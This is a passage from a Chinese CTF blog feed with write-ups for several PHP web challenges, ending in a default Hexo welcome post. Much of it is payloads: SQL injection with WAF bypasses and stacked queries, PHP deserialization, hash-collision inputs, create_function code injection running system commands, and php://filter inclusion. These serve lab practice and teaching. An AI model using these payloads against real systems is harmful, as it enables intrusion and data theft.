class=\"line\">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>\n<h3 id=\"10easyp\"><a class=\"markdownIt-Anchor\" href=\"#10easyp\">#</a> 10.EasyP</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;utils.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$guess</span> = (<span class=\"keyword\">string</span>) <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;guess&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$guess</span> === <span class=\"variable\">$secret</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Congratulations! The flag is: &#x27;</span> . <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$message</span> = <span class=\"string\">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/utils\\.php\\/*$/i&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/show_source/&#x27;</span>, <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REQUEST_URI&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;hacker :)&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>1. <code>$_SERVER['PHP_SELF']</code> <br>\n è¿”å›çš„æ˜¯å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬çš„ç›¸å¯¹è·¯å¾„<br>\n 2.basename ()<br>\n è¿”å›ç»™å®šè·¯å¾„çš„æœ€åä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œä¸åŒ…æ‹¬æŸ¥è¯¢å‚æ•°å’Œçˆ¶ç›®å½•ï¼Œå›å½“å‰æ‰§è¡Œçš„ PHP è„šæœ¬çš„æ–‡ä»¶å<br>\n eg.<br>\n![[Pasted image 20230428144618.png]]<br>\n![[Pasted image 20230428144802.png]]<br>\n <code>$_SERVER['REQUEST_URI']</code> <br>\n åŒ…å«äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬çš„ç›¸å¯¹è·¯å¾„ä»¥åŠä»»ä½•æŸ¥è¯¢å­—ç¬¦ä¸²<br>\nï¼[[Pasted image 20230428145113.png]]<br>\n æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ</p>\n<ol>\n<li>å¯ä»¥åœ¨ utils.php ååŠ ä¸€ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚ % ff (é ASCII å­—ç¬¦), éšä¾¿ä¸€ä¸ªæ±‰å­—ç»™ url ç¼–ç å°±è¡Œï¼Œç»•è¿‡ç¬¬ä¸€ä¸ª preg_match å¹¶ä¸” basename () æ— æ³•å¤„ç†é ASCII å­—ç¬¦ä¼šç›´æ¥è·å– utils.php</li>\n<li>ç¬¬äºŒä¸ªæ­£åˆ™ç»•è¿‡æ–¹å¼æ˜¯åŠ  Url ç¼–ç ç»•è¿‡ï¼Œå‚æ•°åè‡³å°‘éœ€è¦ä¸€ä¸ªæˆ–è€…ä»¥ä¸Šè¿›è¡Œ Url ç¼–ç æˆ–è€… show.source, <code>show[source</code> <br>\npayload:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">index.php/utils.php/%ff?show.source=1</span><br><span class=\"line\">index.php/utils.php/%ff?show[source=1</span><br><span class=\"line\">index.php/utils.php/%ff?%73how_source=1</span><br><span class=\"line\">index.php/utils.php/%E5%93%88(ä¸­æ–‡æ±‰å­—å“ˆçš„urlç¼–ç )?show.source=1</span><br><span class=\"line\">........</span><br></pre></td></tr></table></figure>\n<h3 id=\"11swpuctf-2021-æ–°ç”Ÿèµ›sql\"><a class=\"markdownIt-Anchor\" href=\"#11swpuctf-2021-æ–°ç”Ÿèµ›sql\">#</a> 11.[SWPUCTF 2021 æ–°ç”Ÿèµ›] sql</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?wllm=1 æ­£å¸¸</span><br><span class=\"line\">?wllm=1&#x27; æŠ¥è¯­æ³•é”™è¯¯</span><br><span class=\"line\">?wllm=1&#x27;--+ æœ‰waf,ç–‘ä¼¼è¿‡æ»¤+,æ¢äº†#å‘ç°ä¹Ÿè¢«è¿‡æ»¤</span><br><span class=\"line\">?wllm=1&#x27;%23  æ­£å¸¸,ç”¨urlç»•è¿‡</span><br><span class=\"line\">ç»è¿‡æµ‹è¯•æ­¤é¢˜è¿‡æ»¤äº†ç©ºæ ¼å’Œç­‰å·</span><br><span class=\"line\">ç©ºæ ¼=&gt;/**/</span><br><span class=\"line\">ç­‰å·=&gt;like</span><br><span class=\"line\">å¼€å§‹æ³¨å…¥</span><br><span class=\"line\">?wllm=1&#x27;order/**/by/**/3%23  æ­£å¸¸,4å°±é”™è¯¯,æ‰€ä»¥å­—æ®µä¸º3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,3%23  å›æ˜¾ä½æ˜¯2å’Œ3</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/databse()%23</span><br><span class=\"line\">å‘ç°LTLT_flag(flagåº”è¯¥åœ¨è¿™é‡Œ),users</span><br><span class=\"line\">æŸ¥åˆ—å¸¸è§„æ“ä½œ</span><br><span class=\"line\">å¾—åˆ°id,flag,id,username</span><br><span class=\"line\">æŸ¥å†…å®¹è¿™é‡Œåªèƒ½çœ‹åˆ°å‰é¢,substr,right,reverseéƒ½è¢«è¿‡æ»¤,åªèƒ½ç”¨midæˆªå–(å› ä¸ºå›æ˜¾åªèƒ½æœ‰20ä¸ªï¼Œæ‰€ä»¥1æ¬¡20ä¸ª)</span><br><span class=\"line\">?wllm=-1&#x27;union/**/select/**/1,2,mid(group_concat(flag),1,20)/**/from/**/LTLT_flag%23</span><br><span class=\"line\">è¯»ä¸‰æ¬¡(0,20)(20,20)(40,20)</span><br></pre></td></tr></table></figure>\n<h3 id=\"12éšä¾¿æ³¨\"><a class=\"markdownIt-Anchor\" href=\"#12éšä¾¿æ³¨\">#</a> 12. éšä¾¿æ³¨</h3>\n<p>å­—ç¬¦å‹ï¼Œè¿‡æ»¤äº† select,update,delete,drop,insert,where å’Œ., ä¸åŒºåˆ†å¤§å°å†™</p>\n<h4 id=\"116è¿›åˆ¶ç¼–ç ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#116è¿›åˆ¶ç¼–ç ç»•è¿‡\">#</a> 1.16 è¿›åˆ¶ç¼–ç ç»•è¿‡</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from `1919810931114514`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br></pre></td></tr></table></figure>\n<p>payload1:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span><br></pre></td></tr></table></figure>\n<h4 id=\"2å…¶ä»–å‡½æ•°æ›¿ä»£\"><a class=\"markdownIt-Anchor\" href=\"#2å…¶ä»–å‡½æ•°æ›¿ä»£\">#</a> 2. å…¶ä»–å‡½æ•°æ›¿ä»£</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;;handler `1919810931114514` open;handler `1919810931114514` read next;</span><br></pre></td></tr></table></figure>\n<h4 id=\"3alteræ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#3alteræ³¨å…¥\">#</a> 3.alter æ³¨å…¥</h4>\n<p>ä¿®æ”¹è¡¨å <code>alter table è¡¨å rename æ–°è¡¨å;</code> <br>\n ä¿®æ”¹å­—æ®µå <code>alter table è¡¨å change æ—§å­—æ®µå æ–°å­—æ®µå ç±»å‹;</code> <br>\npayload:<br>\n ä¿®æ”¹ words è¡¨åä¸º words1<br>\n <code>alter table words rename words1;</code> <br>\n ä¿®æ”¹ 1919810931114514 è¡¨åä¸º words<br>\n <code>alter table 1919810931114514 rename words;</code> <br>\n ä¿®æ”¹æ–°çš„ words è¡¨ä¸­çš„ flag åˆ—åä¸º id<br>\n <code>alter table words change flag id varchar(60);</code> <br>\n ç»“åˆ:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27;;alter table words rename words1;alter table` 1919810931114514 `rename words;alter table words change flag id varchar(60);#</span></span><br></pre></td></tr></table></figure>\n<p>ç„¶åæŸ¥ id=1 å°±è¡Œ</p>\n<h3 id=\"13level-up\"><a class=\"markdownIt-Anchor\" href=\"#13level-up\">#</a> 13.level-up</h3>\n<p>å…ˆæŸ¥çœ‹æºä»£ç å‘ç°è¿™ä¸ªæ³¨é‡Š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- here is level 1 --&gt;</span><br><span class=\"line\">&lt;!-- disallow: --&gt;</span><br></pre></td></tr></table></figure>\n<p>è¯´æ˜è¦çœ‹ robots.txt, å‘ç° level_2_1s_h3re.php<br>\n (string) ç”¨æ³•:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"number\">3</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_num</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$num</span>; <span class=\"comment\">// ç»“æœ: &quot;3&quot;ï¼Œå­—ç¬¦ä¸²ç±»å‹</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$bool</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_bool</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$bool</span>; <span class=\"comment\">// ç»“æœ: &quot;1&quot;ï¼Œå­—ç¬¦ä¸²ç±»å‹</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$null_value</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_null_value</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$null_value</span>; <span class=\"comment\">// ç»“æœ: &quot;&quot;ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰ï¼Œå­—ç¬¦ä¸²ç±»å‹</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$arr</span> = <span class=\"keyword\">array</span>(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\"><span class=\"variable\">$str_arr</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$arr</span>; <span class=\"comment\">// ç»“æœ: &quot;Array&quot;ï¼Œå­—ç¬¦ä¸²ç±»å‹</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$obj</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">stdClass</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj</span>-&gt;name = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$str_obj</span> = (<span class=\"keyword\">string</span>)<span class=\"variable\">$obj</span>; <span class=\"comment\">// ç»“æœ: &quot;stdClass Object&quot;ï¼Œå­—ç¬¦ä¸²ç±»å‹</span></span><br></pre></td></tr></table></figure>\n<p>æ•°ç»„ç»•è¿‡å¤±æ•ˆï¼Œè¦ md5 å¼ºç¢°æ’<br>\n payload:<br>\narray1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br>\n<mark> è¿™é‡Œè¦ç”¨ burp æŠ“åŒ…æ”¹ä¼ å‚æ–¹å¼ä¸º post æ‰å¯ä»¥ï¼Œhackbar ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰ç”¨</mark><br>\næ›´å¤šå…³äº md5 çš„ç»•è¿‡çœ‹æˆ‘è¿™ç¯‡åšå®¢<a href=\"https://hq185187.github.io/2023/04/30/md5/\"> md5</a><br>\n æ‰¾åˆ° Level___3.php<br>\n ç„¶åå°±æ˜¯ sha1 çš„å¼ºç¢°æ’ï¼Œsha1 çš„ç»•è¿‡å’Œ md5 å‡ ä¹ä¸€æ ·<br>\nä¸‹é¢ç»™ä¸€ä¸ªå¤§ä½¬çš„ sha1 å¼ºç¢°æ’çš„ payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>\n<p>ç„¶åå¾—åˆ° level_level_4.php<br>\nPHP ä¼šå°†è¯·æ±‚å‚æ•°çš„éæ³•å­—ç¬¦è½¬æ¢æˆä¸‹åˆ’çº¿ (ç©ºæ ¼ï¼Œç‚¹)<br>\nNI+SA+=txw4ever<br>\n æ‹“å±•:<br>\nPHP éœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢æˆæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤å†è§£æå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåšä¸¤ä»¶äº‹:</p>\n<ol>\n<li>åˆ é™¤ç©ºç™½ç¬¦</li>\n<li>å°†æŸäº›å­—ç¬¦ä¸²è½¬æ¢ä¸ºä¸‹åˆ’çº¿<br>\nåŠ å· (%2b) ç©ºæ ¼ (%20) ç‚¹å· (%2e) <code>[(%5b)</code>  å’Œ_(%5f)</li>\n</ol>\n<p>å¾—åˆ° 55_5_55.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//sorry , here is true last level</span></span><br><span class=\"line\"><span class=\"comment\">//^_^</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;str.php&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class=\"variable\">$a</span>)) &#123;</span><br><span class=\"line\">Â  Â  <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">Â  Â  <span class=\"variable\">$a</span>(<span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$b</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>è¿™é‡Œè¦å­¦ä¸€ä¸ªæ–°çŸ¥è¯†:create_function ä»£ç æ³¨å…¥</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$test</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">ç›¸å½“äº:</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"><span class=\"variable\">$a</span>,<span class=\"variable\">$b</span></span>)</span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"variable\">$a</span>+<span class=\"variable\">$b</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>æ¥ä¸ªæ³¨å…¥ä¾‹å­</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$test</span>=<span class=\"title function_ invoke__\">create_function</span>(<span class=\"string\">&#x27;$a&#x27;</span>,<span class=\"string\">&#x27;$b&#x27;</span>,<span class=\"string\">&#x27;return($a+$b);&#125;eval($_POST[&quot;a&quot;]);/*)</span></span><br><span class=\"line\"><span class=\"string\">ç›¸å½“äº</span></span><br><span class=\"line\"><span class=\"string\">function test($a,$b)&#123;</span></span><br><span class=\"line\"><span class=\"string\">return($a+$b);&#125;</span></span><br><span class=\"line\"><span class=\"string\">eval($_POST[&quot;a&quot;]);/*</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>ç›´æ¥æ„é€  payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;ls /&quot;);/*</span><br><span class=\"line\">?a=\\create_function&amp;b=return &quot;1&quot;;)system(&quot;cat /flag&quot;);/*</span><br></pre></td></tr></table></figure>\n<h3 id=\"14é¹åŸæ¯-2022ç®€å•åŒ…å«\"><a class=\"markdownIt-Anchor\" href=\"#14é¹åŸæ¯-2022ç®€å•åŒ…å«\">#</a> 14.[é¹åŸæ¯ 2022] ç®€å•åŒ…å«</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=php://filter/convert.base64-encode/resource=flag.phpå‘ç°è¢«è¿‡æ»¤</span><br><span class=\"line\">flag=php://filter/convert.base64-encode/resource=index.phpçœ‹æºç </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$path</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;flag&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>)) &lt; <span class=\"number\">800</span> &amp;&amp; <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/flag/&#x27;</span>, <span class=\"variable\">$path</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;nssctf waf!&#x27;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span>(<span class=\"variable\">$path</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>post çš„æ•°æ®é‡Œæœ‰æœ‰ flag å¹¶ä¸” &gt;=800<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=aaaa(800ä¸ªa)&amp;flag=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/23/hello-world/",
            "url": "https://hq185187.github.io/2023/04/23/hello-world/",
            "title": "Hello World",
            "date_published": "2023-04-23T15:55:29.640Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n<p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight 